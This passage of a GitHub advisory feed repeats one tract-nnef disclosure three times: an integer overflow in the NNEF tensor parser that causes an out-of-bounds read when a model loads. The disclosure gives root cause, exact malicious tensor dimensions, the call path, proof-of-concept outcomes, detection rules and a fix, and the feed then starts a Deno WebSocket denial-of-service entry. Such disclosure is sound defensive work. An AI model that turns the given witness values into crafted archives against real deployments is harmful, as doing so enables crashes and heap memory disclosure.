<li><strong>Public load API</strong> — build a malicious <code>.nnef.tar</code> (<code>graph.nnef</code> with <code>variable(label='weights', shape=[...])</code> + <code>weights.dat</code>) and call <code>nnef().model_for_read()</code>:<ul>
<li>returns <code>Ok</code> with one <code>Const</code> node, <code>out[0].fact.uniform=Some(...)</code>, <code>len()=2305843009213693959</code> over a 56-byte buffer → confirms <code>as_uniform</code>/<code>is_uniform_t</code>/<code>as_slice_unchecked</code> performed an <strong>OOB read on load</strong> (bounded over-read here because <code>is_uniform</code>'s <code>.all()</code> short-circuits on the uniform <code>0x41</code> payload).</li>
</ul>
</li>
<li><strong>Optimized graph</strong> — same archive but the const is consumed (<code>output = mul(weights, weights)</code>), then <code>into_optimized</code> / <code>run</code>:<ul>
<li><strong>Does not crash.</strong> With both a uniform (<code>0x41×56</code>) and a non-uniform (<code>0..56</code>) payload, <code>into_optimized</code> const-folds <code>mul(const, const)</code> to a single node <strong>without a full-length materialization</strong> of the oversized const, and <code>run</code> completes. A reliable arbitrary-length crash through a <em>normal optimized graph</em> was therefore NOT demonstrated; the always-on primitive is the bounded load-time over-read (scenario 2), and the wild-slice SIGSEGV is shown via direct access (scenario 1).</li>
</ul>
</li>
</ol>
<p>Runnable PoC sources are available to the maintainers on request.</p>
<h2 id="detection">Detection</h2>
<ul>
<li><strong>Static:</strong> flag <code>*.iter().product::&lt;usize&gt;()</code> over externally-controlled dimensions without <code>checked_*</code>/<code>try_into</code>, especially when the result feeds an allocation and a separately-tracked <code>len</code>.</li>
<li><strong>Runtime / fleet:</strong> crash telemetry showing SIGSEGV inside <code>is_uniform_t</code> / <code>from_raw_parts</code> during NNEF model load; an ASAN build flags <code>heap-buffer-overflow READ</code> in <code>read_tensor</code>→<code>as_uniform</code>.</li>
<li><strong>Input filter (compensating):</strong> reject NNEF <code>.dat</code> tensors where <code>product(dims)</code> overflows <code>u64</code>, or where <code>product(dims) * size_of(dt) != data_size_bytes</code> computed in <strong>checked</strong> arithmetic, before constructing the tensor.</li>
<li><strong>YARA-ish heuristic for <code>.dat</code> blobs:</strong> NNEF magic <code>4E EF 01 00</code>, <code>rank&lt;=8</code>, and any <code>dim &gt;= 0x10000</code> whose checked product with the others overflows.</li>
</ul>
<h2 id="mitigation-suggested-fix">Mitigation (suggested fix)</h2>
<p>In <code>read_tensor</code>, compute the element count and byte size with checked arithmetic and reject on overflow, mirroring the guard already present on the block-quant path (<code>ensure!(expected_len == data_size_bytes)</code> added in <code>eacd13ccb</code>):</p>
<pre><code>let len = shape.iter().try_fold(1usize, |a, &amp;d| a.checked_mul(d))
    .context("tensor shape product overflows usize")?;
let byte_size = len.checked_mul(dt.size_of())
    .context("tensor byte size overflows usize")?;
ensure!(byte_size == header.data_size_bytes as usize, "shape/len vs data_size_bytes mismatch");
</code></pre>
<p>Defense in depth: make <code>Tensor::uninitialized_aligned_dt</code> reject when <code>product(shape)*size_of</code> overflows, and add a <code>len * size_of == storage.byte_len()</code> invariant check in the <code>as_slice*</code> accessors (or at <code>Tensor</code> construction) so a <code>len</code>/storage mismatch can never reach <code>from_raw_parts</code>.</p>
<p>Mapping: CWE-190, CWE-125; mitigations align with input validation (OWASP ASVS V5) and safe integer handling (CERT INT32-C analogue).</p>
<h2 id="prior-art--why-this-is-not-already-fixed">Prior art / why this is not already fixed</h2>
<ul>
<li><code>eacd13ccb</code> (2026-03-23, "Add blob-size validation to BlockQuantStorage constructors") added overflow/blob-size validation <strong>only to the block-quant path</strong>; the dense <code>DatLoader</code>/<code>read_tensor</code> path was left unguarded. The maintainers fixed the sibling and missed this one.</li>
<li>PR #745 ("Fix UB by creating uninit Tensors with a non-null pointer") is a <em>different</em> UB (null base pointer on zero-length slices) in the same module family.</li>
<li>No CVE / RustSec / GHSA / OSV / Huntr entry matches this bug; last change to <code>nnef/src/tensors.rs</code> predates HEAD and added no overflow guard to the dense path.</li>
</ul>
<hr>
<p>Reported by: s1ko (<a href="mailto:s1ko@riseup.net">s1ko@riseup.net</a> · github.com/s1ko)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg</a></li>
<li><a href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/advisories/GHSA-x5mv-8wgw-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:05:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
        <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
        <link href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg"/>
        <updated>2026-06-18T15:05:24.000Z</updated>
        <content type="html"><![CDATA[<ul>
<li><strong>Component:</strong> <code>tract-nnef</code> (<code>nnef/src/tensors.rs::read_tensor</code>) + <code>tract-data</code> (<code>data/src/tensor.rs</code>)</li>
<li><strong>Affected versions:</strong> <code>&lt; 0.21.16</code>, <code>0.22.0</code>–<code>0.22.2</code>, <code>0.23.0</code>–<code>0.23.1</code> — the dense <code>DatLoader</code> path was unguarded across all three release lines; patched in 0.21.16 / 0.22.2 / 0.23.1</li>
<li><strong>Class:</strong> CWE-190 (integer overflow) → CWE-125 (out-of-bounds read)</li>
<li><strong>Trigger:</strong> loading a crafted NNEF model archive (<code>*.nnef.tgz</code> / <code>*.nnef.tar</code> / dir) via the public <code>tract_nnef::nnef().model_for_path</code> / <code>model_for_read</code></li>
<li><strong>Impact:</strong> <code>read_tensor</code> returns a memory-unsafe tensor (reported <code>len</code> 2^61 over a 56-byte heap allocation). Always-on primitive: a <strong>bounded heap out-of-bounds read</strong> during model build (<code>as_uniform</code>), an adjacent-heap information-disclosure reachable via the public load API. The resulting slice is an unsound <code>from_raw_parts(ptr, 2^61)</code> that <strong>SIGSEGVs (DoS)</strong> on any access past the mapped region (demonstrated by direct access). No out-of-bounds write and no RCE were achieved — tract's const-folding/<code>as_uniform</code> fast-paths fold simple consuming graphs without the full read.</li>
<li><strong>Severity:</strong> Medium</li>
</ul>
<h2 id="summary">Summary</h2>
<p><code>read_tensor</code> builds a tensor <code>shape</code> from attacker-controlled 32-bit dimensions and computes the element count <code>len = product(shape)</code> and the byte allocation <code>product(shape) * size_of(dt)</code> with <strong>unchecked <code>usize</code> arithmetic</strong>. In <code>--release</code> (no <code>overflow-checks</code>), both products wrap modulo 2^64. An attacker chooses dimensions so that the wrapped products collapse to a small value that satisfies the header consistency check, while the <em>true</em> element count remains astronomically large. <code>read_tensor</code> returns <code>Ok</code> with a <code>Tensor</code> whose reported <code>len</code> (e.g. 2^61+7) is far larger than its backing heap allocation (e.g. 56 bytes). The unchecked slice accessor <code>as_slice_unchecked</code> (<code>from_raw_parts(ptr, self.len)</code>) then produces a slice spanning ~18 exabytes over a 56-byte buffer. The out-of-bounds read fires automatically during model build (no inference required), reachable through the default <code>DatLoader</code> resource loader.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>nnef/src/tensors.rs</code>, <code>read_tensor</code>:</p>
<pre><code>let shape: TVec&lt;usize&gt; = header.dims[0..header.rank as usize].iter().map(|d| *d as _).collect();
let len = shape.iter().product::&lt;usize&gt;();                       // (1) unchecked, wraps
...
} else if header.bits_per_item != u32::MAX
    &amp;&amp; len * (header.bits_per_item as usize / 8) != header.data_size_bytes as usize  // (2) wrapped == u32
{
    bail!(...);
}
...
let mut tensor = unsafe { Tensor::uninitialized_dt(dt, &amp;shape)? };   // (3) alloc off the same wrapped product
...
reader.read_exact(plain.as_bytes_mut())?;                            // storage-bounded read, no overflow here
Ok(tensor)
</code></pre>
<p><code>data/src/tensor.rs</code>, <code>uninitialized_aligned_dt</code>:</p>
<pre><code>let bytes = shape.iter().cloned().product::&lt;usize&gt;() * dt.size_of();  // (3) wraps to the same small value
let storage = ... Blob::new_for_size_and_align(bytes, alignment) ...;
...
tensor.update_strides_and_len();                                     // len = product(shape), wraps, no clamp
</code></pre>
<p>The three quantities — the consistency-check LHS <code>(2)</code>, the allocation <code>(3)</code>, and the reported <code>len</code> — are all the same wrapped <code>product(shape)*size_of</code>, so they stay mutually consistent and <strong>the consistency check at <code>(2)</code> cannot catch the overflow</strong>. <code>data_size_bytes</code> is a <code>u32</code>, so the attacker simply sets it to the wrapped value.</p>
<p>Corruption sink — <code>data/src/tensor.rs::as_slice_unchecked</code> (and <code>data/src/tensor/plain_view.rs::as_slice_unchecked</code>):</p>
<pre><code>if self.storage.byte_len() == 0 { &amp;[] }
else { std::slice::from_raw_parts(self.as_ptr_unchecked(), self.len()) }  // len = 2^61 over a 56-byte alloc
</code></pre>
<p>The only guard is <code>byte_len() == 0</code>. A small <strong>non-zero</strong> allocation defeats it and yields an unsound oversized slice.</p>
<h2 id="witness-f64">Witness (F64)</h2>
<pre><code>dims          = [33955849, 7005787, 359, 3, 3, 3]   (rank 6, each &lt;= u32::MAX)
product(shape)= 2_305_843_009_213_693_959 = 2^61 + 7
bits_per_item = 64 (F64), item_type = 0, item_type_vendor = 0
data_size_bytes = 56            # == (2^61+7)*8 mod 2^64
</code></pre>
<ul>
<li><code>len * (bits/8) mod 2^64 = (2^61+7)*8 mod 2^64 = 56 == data_size_bytes</code> → consistency check passes.</li>
<li>allocation = <code>(2^61+7)*8 mod 2^64 = 56</code> bytes (7 × F64).</li>
<li>reported <code>len</code> = <code>2^61+7</code> elements.</li>
</ul>
<p>Only the <code>is_copy()</code> numeric arms (F16/F32/F64/int, and likely the <code>complex</code> arms) are exploitable. F64 is the cleanest (<code>bits/8</code> divides evenly). The <code>bool</code>, <code>String</code>, and block-quant paths are each guarded by an independent mechanism (size_of==1 prevents byte/element divergence; <code>String</code> bails on a missing <code>num_traits::Zero</code> impl; block-quant has its own <code>ensure!(expected_len == data_size_bytes)</code> and uses non-plain <code>Exotic</code> storage).</p>
<h2 id="reachability-load-time-public-api">Reachability (load-time, public API)</h2>
<pre><code>nnef().model_for_read(tar)
  -&gt; proto_model_for_read                       nnef/src/framework.rs:303
    -&gt; DatLoader.try_load (any *.dat)            nnef/src/resource.rs:97   (default loader, framework.rs:33)
      -&gt; read_tensor -&gt; Ok(Tensor{len=2^61+7, storage=56B})   nnef/src/tensors.rs:61
  -&gt; into_typed_model -&gt; variable() fragment     nnef/src/ops/nnef/deser.rs:74
       ensure!(tensor.shape() == &amp;*shape)        deser.rs:122  (attacker matches shape in graph.nnef -&gt; passes)
    -&gt; Const::new -&gt; wire_node                   core/src/model/typed.rs:67
      -&gt; Const::output_facts                     core/src/ops/konst.rs:54
        -&gt; TypedFact::try_from                   core/src/model/fact.rs:459
          -&gt; Tensor::as_uniform -&gt; is_uniform_t::&lt;f64&gt;   data/src/tensor.rs:1099
            -&gt; as_slice_unchecked::&lt;f64&gt;         data/src/tensor.rs:1044
              -&gt; from_raw_parts(ptr, 2^61+7) over 56-byte buffer -&gt; OOB READ
</code></pre>
<p>No shape-vs-storage re-validation exists anywhere on this path (<code>proto.validate()</code> checks only the AST; <code>Const::new</code> checks only <code>is_plain</code>; <code>check_for_access</code> checks only the datum type; even the <em>safe</em> <code>PlainView::as_slice</code> does <code>from_raw_parts(ptr, self.len)</code> with no length guard).</p>
<h2 id="execution-proof-of-concept">Execution (proof of concept)</h2>
<p>Reproduced against the crate at the affected revision, <code>--release</code>, x86_64-linux. Three scenarios:</p>
<ol>
<li><strong>Direct <code>read_tensor</code></strong> — feed the crafted 128-byte header + 56-byte payload:<ul>
<li><code>read_tensor -&gt; Ok</code>, <code>shape=[33955849,7005787,359,3,3,3]</code>, <code>len()=2305843009213693959</code>, <code>as_bytes().len()=56</code>, <code>as_slice::&lt;f64&gt;().len()=2305843009213693959</code>.</li>
<li><code>s[7]</code> (first element past the 56-byte allocation) returns <code>0x0000000000000041</code> → <strong>heap OOB read</strong> (adjacent-heap disclosure).</li>
<li><code>s[1&lt;&lt;40]</code> → <strong>SIGSEGV</strong> (signal 11).</li>
</ul>
</li>
<li><strong>Public load API</strong> — build a malicious <code>.nnef.tar</code> (<code>graph.nnef</code> with <code>variable(label='weights', shape=[...])</code> + <code>weights.dat</code>) and call <code>nnef().model_for_read()</code>:<ul>
<li>returns <code>Ok</code> with one <code>Const</code> node, <code>out[0].fact.uniform=Some(...)</code>, <code>len()=2305843009213693959</code> over a 56-byte buffer → confirms <code>as_uniform</code>/<code>is_uniform_t</code>/<code>as_slice_unchecked</code> performed an <strong>OOB read on load</strong> (bounded over-read here because <code>is_uniform</code>'s <code>.all()</code> short-circuits on the uniform <code>0x41</code> payload).</li>
</ul>
</li>
<li><strong>Optimized graph</strong> — same archive but the const is consumed (<code>output = mul(weights, weights)</code>), then <code>into_optimized</code> / <code>run</code>:<ul>
<li><strong>Does not crash.</strong> With both a uniform (<code>0x41×56</code>) and a non-uniform (<code>0..56</code>) payload, <code>into_optimized</code> const-folds <code>mul(const, const)</code> to a single node <strong>without a full-length materialization</strong> of the oversized const, and <code>run</code> completes. A reliable arbitrary-length crash through a <em>normal optimized graph</em> was therefore NOT demonstrated; the always-on primitive is the bounded load-time over-read (scenario 2), and the wild-slice SIGSEGV is shown via direct access (scenario 1).</li>
</ul>
</li>
</ol>
<p>Runnable PoC sources are available to the maintainers on request.</p>
<h2 id="detection">Detection</h2>
<ul>
<li><strong>Static:</strong> flag <code>*.iter().product::&lt;usize&gt;()</code> over externally-controlled dimensions without <code>checked_*</code>/<code>try_into</code>, especially when the result feeds an allocation and a separately-tracked <code>len</code>.</li>
<li><strong>Runtime / fleet:</strong> crash telemetry showing SIGSEGV inside <code>is_uniform_t</code> / <code>from_raw_parts</code> during NNEF model load; an ASAN build flags <code>heap-buffer-overflow READ</code> in <code>read_tensor</code>→<code>as_uniform</code>.</li>
<li><strong>Input filter (compensating):</strong> reject NNEF <code>.dat</code> tensors where <code>product(dims)</code> overflows <code>u64</code>, or where <code>product(dims) * size_of(dt) != data_size_bytes</code> computed in <strong>checked</strong> arithmetic, before constructing the tensor.</li>
<li><strong>YARA-ish heuristic for <code>.dat</code> blobs:</strong> NNEF magic <code>4E EF 01 00</code>, <code>rank&lt;=8</code>, and any <code>dim &gt;= 0x10000</code> whose checked product with the others overflows.</li>
</ul>
<h2 id="mitigation-suggested-fix">Mitigation (suggested fix)</h2>
<p>In <code>read_tensor</code>, compute the element count and byte size with checked arithmetic and reject on overflow, mirroring the guard already present on the block-quant path (<code>ensure!(expected_len == data_size_bytes)</code> added in <code>eacd13ccb</code>):</p>
<pre><code>let len = shape.iter().try_fold(1usize, |a, &amp;d| a.checked_mul(d))
    .context("tensor shape product overflows usize")?;
let byte_size = len.checked_mul(dt.size_of())
    .context("tensor byte size overflows usize")?;
ensure!(byte_size == header.data_size_bytes as usize, "shape/len vs data_size_bytes mismatch");
</code></pre>
<p>Defense in depth: make <code>Tensor::uninitialized_aligned_dt</code> reject when <code>product(shape)*size_of</code> overflows, and add a <code>len * size_of == storage.byte_len()</code> invariant check in the <code>as_slice*</code> accessors (or at <code>Tensor</code> construction) so a <code>len</code>/storage mismatch can never reach <code>from_raw_parts</code>.</p>
<p>Mapping: CWE-190, CWE-125; mitigations align with input validation (OWASP ASVS V5) and safe integer handling (CERT INT32-C analogue).</p>
<h2 id="prior-art--why-this-is-not-already-fixed">Prior art / why this is not already fixed</h2>
<ul>
<li><code>eacd13ccb</code> (2026-03-23, "Add blob-size validation to BlockQuantStorage constructors") added overflow/blob-size validation <strong>only to the block-quant path</strong>; the dense <code>DatLoader</code>/<code>read_tensor</code> path was left unguarded. The maintainers fixed the sibling and missed this one.</li>
<li>PR #745 ("Fix UB by creating uninit Tensors with a non-null pointer") is a <em>different</em> UB (null base pointer on zero-length slices) in the same module family.</li>
<li>No CVE / RustSec / GHSA / OSV / Huntr entry matches this bug; last change to <code>nnef/src/tensors.rs</code> predates HEAD and added no overflow guard to the dense path.</li>
</ul>
<hr>
<p>Reported by: s1ko (<a href="mailto:s1ko@riseup.net">s1ko@riseup.net</a> · github.com/s1ko)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg</a></li>
<li><a href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/advisories/GHSA-x5mv-8wgw-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:05:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tract-nnef] tract-nnef: integer overflow in NNEF `.dat` tensor parser yields an out-of-bounds read on model load]]></title>
        <id>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</id>
        <link href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg"/>
        <updated>2026-06-18T15:05:24.000Z</updated>
        <content type="html"><![CDATA[<ul>
<li><strong>Component:</strong> <code>tract-nnef</code> (<code>nnef/src/tensors.rs::read_tensor</code>) + <code>tract-data</code> (<code>data/src/tensor.rs</code>)</li>
<li><strong>Affected versions:</strong> <code>&lt; 0.21.16</code>, <code>0.22.0</code>–<code>0.22.2</code>, <code>0.23.0</code>–<code>0.23.1</code> — the dense <code>DatLoader</code> path was unguarded across all three release lines; patched in 0.21.16 / 0.22.2 / 0.23.1</li>
<li><strong>Class:</strong> CWE-190 (integer overflow) → CWE-125 (out-of-bounds read)</li>
<li><strong>Trigger:</strong> loading a crafted NNEF model archive (<code>*.nnef.tgz</code> / <code>*.nnef.tar</code> / dir) via the public <code>tract_nnef::nnef().model_for_path</code> / <code>model_for_read</code></li>
<li><strong>Impact:</strong> <code>read_tensor</code> returns a memory-unsafe tensor (reported <code>len</code> 2^61 over a 56-byte heap allocation). Always-on primitive: a <strong>bounded heap out-of-bounds read</strong> during model build (<code>as_uniform</code>), an adjacent-heap information-disclosure reachable via the public load API. The resulting slice is an unsound <code>from_raw_parts(ptr, 2^61)</code> that <strong>SIGSEGVs (DoS)</strong> on any access past the mapped region (demonstrated by direct access). No out-of-bounds write and no RCE were achieved — tract's const-folding/<code>as_uniform</code> fast-paths fold simple consuming graphs without the full read.</li>
<li><strong>Severity:</strong> Medium</li>
</ul>
<h2 id="summary">Summary</h2>
<p><code>read_tensor</code> builds a tensor <code>shape</code> from attacker-controlled 32-bit dimensions and computes the element count <code>len = product(shape)</code> and the byte allocation <code>product(shape) * size_of(dt)</code> with <strong>unchecked <code>usize</code> arithmetic</strong>. In <code>--release</code> (no <code>overflow-checks</code>), both products wrap modulo 2^64. An attacker chooses dimensions so that the wrapped products collapse to a small value that satisfies the header consistency check, while the <em>true</em> element count remains astronomically large. <code>read_tensor</code> returns <code>Ok</code> with a <code>Tensor</code> whose reported <code>len</code> (e.g. 2^61+7) is far larger than its backing heap allocation (e.g. 56 bytes). The unchecked slice accessor <code>as_slice_unchecked</code> (<code>from_raw_parts(ptr, self.len)</code>) then produces a slice spanning ~18 exabytes over a 56-byte buffer. The out-of-bounds read fires automatically during model build (no inference required), reachable through the default <code>DatLoader</code> resource loader.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>nnef/src/tensors.rs</code>, <code>read_tensor</code>:</p>
<pre><code>let shape: TVec&lt;usize&gt; = header.dims[0..header.rank as usize].iter().map(|d| *d as _).collect();
let len = shape.iter().product::&lt;usize&gt;();                       // (1) unchecked, wraps
...
} else if header.bits_per_item != u32::MAX
    &amp;&amp; len * (header.bits_per_item as usize / 8) != header.data_size_bytes as usize  // (2) wrapped == u32
{
    bail!(...);
}
...
let mut tensor = unsafe { Tensor::uninitialized_dt(dt, &amp;shape)? };   // (3) alloc off the same wrapped product
...
reader.read_exact(plain.as_bytes_mut())?;                            // storage-bounded read, no overflow here
Ok(tensor)
</code></pre>
<p><code>data/src/tensor.rs</code>, <code>uninitialized_aligned_dt</code>:</p>
<pre><code>let bytes = shape.iter().cloned().product::&lt;usize&gt;() * dt.size_of();  // (3) wraps to the same small value
let storage = ... Blob::new_for_size_and_align(bytes, alignment) ...;
...
tensor.update_strides_and_len();                                     // len = product(shape), wraps, no clamp
</code></pre>
<p>The three quantities — the consistency-check LHS <code>(2)</code>, the allocation <code>(3)</code>, and the reported <code>len</code> — are all the same wrapped <code>product(shape)*size_of</code>, so they stay mutually consistent and <strong>the consistency check at <code>(2)</code> cannot catch the overflow</strong>. <code>data_size_bytes</code> is a <code>u32</code>, so the attacker simply sets it to the wrapped value.</p>
<p>Corruption sink — <code>data/src/tensor.rs::as_slice_unchecked</code> (and <code>data/src/tensor/plain_view.rs::as_slice_unchecked</code>):</p>
<pre><code>if self.storage.byte_len() == 0 { &amp;[] }
else { std::slice::from_raw_parts(self.as_ptr_unchecked(), self.len()) }  // len = 2^61 over a 56-byte alloc
</code></pre>
<p>The only guard is <code>byte_len() == 0</code>. A small <strong>non-zero</strong> allocation defeats it and yields an unsound oversized slice.</p>
<h2 id="witness-f64">Witness (F64)</h2>
<pre><code>dims          = [33955849, 7005787, 359, 3, 3, 3]   (rank 6, each &lt;= u32::MAX)
product(shape)= 2_305_843_009_213_693_959 = 2^61 + 7
bits_per_item = 64 (F64), item_type = 0, item_type_vendor = 0
data_size_bytes = 56            # == (2^61+7)*8 mod 2^64
</code></pre>
<ul>
<li><code>len * (bits/8) mod 2^64 = (2^61+7)*8 mod 2^64 = 56 == data_size_bytes</code> → consistency check passes.</li>
<li>allocation = <code>(2^61+7)*8 mod 2^64 = 56</code> bytes (7 × F64).</li>
<li>reported <code>len</code> = <code>2^61+7</code> elements.</li>
</ul>
<p>Only the <code>is_copy()</code> numeric arms (F16/F32/F64/int, and likely the <code>complex</code> arms) are exploitable. F64 is the cleanest (<code>bits/8</code> divides evenly). The <code>bool</code>, <code>String</code>, and block-quant paths are each guarded by an independent mechanism (size_of==1 prevents byte/element divergence; <code>String</code> bails on a missing <code>num_traits::Zero</code> impl; block-quant has its own <code>ensure!(expected_len == data_size_bytes)</code> and uses non-plain <code>Exotic</code> storage).</p>
<h2 id="reachability-load-time-public-api">Reachability (load-time, public API)</h2>
<pre><code>nnef().model_for_read(tar)
  -&gt; proto_model_for_read                       nnef/src/framework.rs:303
    -&gt; DatLoader.try_load (any *.dat)            nnef/src/resource.rs:97   (default loader, framework.rs:33)
      -&gt; read_tensor -&gt; Ok(Tensor{len=2^61+7, storage=56B})   nnef/src/tensors.rs:61
  -&gt; into_typed_model -&gt; variable() fragment     nnef/src/ops/nnef/deser.rs:74
       ensure!(tensor.shape() == &amp;*shape)        deser.rs:122  (attacker matches shape in graph.nnef -&gt; passes)
    -&gt; Const::new -&gt; wire_node                   core/src/model/typed.rs:67
      -&gt; Const::output_facts                     core/src/ops/konst.rs:54
        -&gt; TypedFact::try_from                   core/src/model/fact.rs:459
          -&gt; Tensor::as_uniform -&gt; is_uniform_t::&lt;f64&gt;   data/src/tensor.rs:1099
            -&gt; as_slice_unchecked::&lt;f64&gt;         data/src/tensor.rs:1044
              -&gt; from_raw_parts(ptr, 2^61+7) over 56-byte buffer -&gt; OOB READ
</code></pre>
<p>No shape-vs-storage re-validation exists anywhere on this path (<code>proto.validate()</code> checks only the AST; <code>Const::new</code> checks only <code>is_plain</code>; <code>check_for_access</code> checks only the datum type; even the <em>safe</em> <code>PlainView::as_slice</code> does <code>from_raw_parts(ptr, self.len)</code> with no length guard).</p>
<h2 id="execution-proof-of-concept">Execution (proof of concept)</h2>
<p>Reproduced against the crate at the affected revision, <code>--release</code>, x86_64-linux. Three scenarios:</p>
<ol>
<li><strong>Direct <code>read_tensor</code></strong> — feed the crafted 128-byte header + 56-byte payload:<ul>
<li><code>read_tensor -&gt; Ok</code>, <code>shape=[33955849,7005787,359,3,3,3]</code>, <code>len()=2305843009213693959</code>, <code>as_bytes().len()=56</code>, <code>as_slice::&lt;f64&gt;().len()=2305843009213693959</code>.</li>
<li><code>s[7]</code> (first element past the 56-byte allocation) returns <code>0x0000000000000041</code> → <strong>heap OOB read</strong> (adjacent-heap disclosure).</li>
<li><code>s[1&lt;&lt;40]</code> → <strong>SIGSEGV</strong> (signal 11).</li>
</ul>
</li>
<li><strong>Public load API</strong> — build a malicious <code>.nnef.tar</code> (<code>graph.nnef</code> with <code>variable(label='weights', shape=[...])</code> + <code>weights.dat</code>) and call <code>nnef().model_for_read()</code>:<ul>
<li>returns <code>Ok</code> with one <code>Const</code> node, <code>out[0].fact.uniform=Some(...)</code>, <code>len()=2305843009213693959</code> over a 56-byte buffer → confirms <code>as_uniform</code>/<code>is_uniform_t</code>/<code>as_slice_unchecked</code> performed an <strong>OOB read on load</strong> (bounded over-read here because <code>is_uniform</code>'s <code>.all()</code> short-circuits on the uniform <code>0x41</code> payload).</li>
</ul>
</li>
<li><strong>Optimized graph</strong> — same archive but the const is consumed (<code>output = mul(weights, weights)</code>), then <code>into_optimized</code> / <code>run</code>:<ul>
<li><strong>Does not crash.</strong> With both a uniform (<code>0x41×56</code>) and a non-uniform (<code>0..56</code>) payload, <code>into_optimized</code> const-folds <code>mul(const, const)</code> to a single node <strong>without a full-length materialization</strong> of the oversized const, and <code>run</code> completes. A reliable arbitrary-length crash through a <em>normal optimized graph</em> was therefore NOT demonstrated; the always-on primitive is the bounded load-time over-read (scenario 2), and the wild-slice SIGSEGV is shown via direct access (scenario 1).</li>
</ul>
</li>
</ol>
<p>Runnable PoC sources are available to the maintainers on request.</p>
<h2 id="detection">Detection</h2>
<ul>
<li><strong>Static:</strong> flag <code>*.iter().product::&lt;usize&gt;()</code> over externally-controlled dimensions without <code>checked_*</code>/<code>try_into</code>, especially when the result feeds an allocation and a separately-tracked <code>len</code>.</li>
<li><strong>Runtime / fleet:</strong> crash telemetry showing SIGSEGV inside <code>is_uniform_t</code> / <code>from_raw_parts</code> during NNEF model load; an ASAN build flags <code>heap-buffer-overflow READ</code> in <code>read_tensor</code>→<code>as_uniform</code>.</li>
<li><strong>Input filter (compensating):</strong> reject NNEF <code>.dat</code> tensors where <code>product(dims)</code> overflows <code>u64</code>, or where <code>product(dims) * size_of(dt) != data_size_bytes</code> computed in <strong>checked</strong> arithmetic, before constructing the tensor.</li>
<li><strong>YARA-ish heuristic for <code>.dat</code> blobs:</strong> NNEF magic <code>4E EF 01 00</code>, <code>rank&lt;=8</code>, and any <code>dim &gt;= 0x10000</code> whose checked product with the others overflows.</li>
</ul>
<h2 id="mitigation-suggested-fix">Mitigation (suggested fix)</h2>
<p>In <code>read_tensor</code>, compute the element count and byte size with checked arithmetic and reject on overflow, mirroring the guard already present on the block-quant path (<code>ensure!(expected_len == data_size_bytes)</code> added in <code>eacd13ccb</code>):</p>
<pre><code>let len = shape.iter().try_fold(1usize, |a, &amp;d| a.checked_mul(d))
    .context("tensor shape product overflows usize")?;
let byte_size = len.checked_mul(dt.size_of())
    .context("tensor byte size overflows usize")?;
ensure!(byte_size == header.data_size_bytes as usize, "shape/len vs data_size_bytes mismatch");
</code></pre>
<p>Defense in depth: make <code>Tensor::uninitialized_aligned_dt</code> reject when <code>product(shape)*size_of</code> overflows, and add a <code>len * size_of == storage.byte_len()</code> invariant check in the <code>as_slice*</code> accessors (or at <code>Tensor</code> construction) so a <code>len</code>/storage mismatch can never reach <code>from_raw_parts</code>.</p>
<p>Mapping: CWE-190, CWE-125; mitigations align with input validation (OWASP ASVS V5) and safe integer handling (CERT INT32-C analogue).</p>
<h2 id="prior-art--why-this-is-not-already-fixed">Prior art / why this is not already fixed</h2>
<ul>
<li><code>eacd13ccb</code> (2026-03-23, "Add blob-size validation to BlockQuantStorage constructors") added overflow/blob-size validation <strong>only to the block-quant path</strong>; the dense <code>DatLoader</code>/<code>read_tensor</code> path was left unguarded. The maintainers fixed the sibling and missed this one.</li>
<li>PR #745 ("Fix UB by creating uninit Tensors with a non-null pointer") is a <em>different</em> UB (null base pointer on zero-length slices) in the same module family.</li>
<li>No CVE / RustSec / GHSA / OSV / Huntr entry matches this bug; last change to <code>nnef/src/tensors.rs</code> predates HEAD and added no overflow guard to the dense path.</li>
</ul>
<hr>
<p>Reported by: s1ko (<a href="mailto:s1ko@riseup.net">s1ko@riseup.net</a> · github.com/s1ko)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/sonos/tract/security/advisories/GHSA-x5mv-8wgw-29hg</a></li>
<li><a href="https://github.com/advisories/GHSA-x5mv-8wgw-29hg">https://github.com/advisories/GHSA-x5mv-8wgw-29hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5mv-8wgw-29hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T15:05:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: Denial of service via non-ASCII bytes in WebSocket response headers]]></title>
        <id>https://github.com/advisories/GHSA-x2qc-cmh9-f4hf</id>
        <link href="https://github.com/advisories/GHSA-x2qc-cmh9-f4hf"/>
        <updated>2026-06-17T18:48:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Deno program that opens a client <code>WebSocket</code> connection could be crashed by
the remote server. While handling the WebSocket handshake response, Deno parsed
the <code>Sec-WebSocket-Protocol</code> and <code>Sec-WebSocket-Extensions</code> response headers in
